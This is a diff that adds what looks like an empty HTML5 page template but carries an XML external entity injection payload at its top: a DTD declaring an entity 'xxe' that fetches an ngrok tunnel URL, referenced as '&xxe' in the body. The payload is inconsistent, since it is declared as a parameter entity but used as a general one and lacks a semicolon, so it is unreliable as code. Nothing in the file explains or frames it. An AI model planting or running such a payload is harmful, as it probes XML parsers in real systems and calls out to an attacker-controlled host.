@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "http://b444afe17efc.ngrok.io/xxe" >
+]>
+<html class="no-js" lang="">
+
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="">
+  <meta property="og:type" content="">
+  <meta property="og:url" content="">
+  <meta property="og:image" content="">
+
+  <meta name="theme-color" content="#fafafa">
+  <script>
+      document.addEventListener('DOMContentLoaded', () => {
+
+      });
+  </script>
+</head>
+
+<body>
+    &xxe
+</body>
+
+</html>
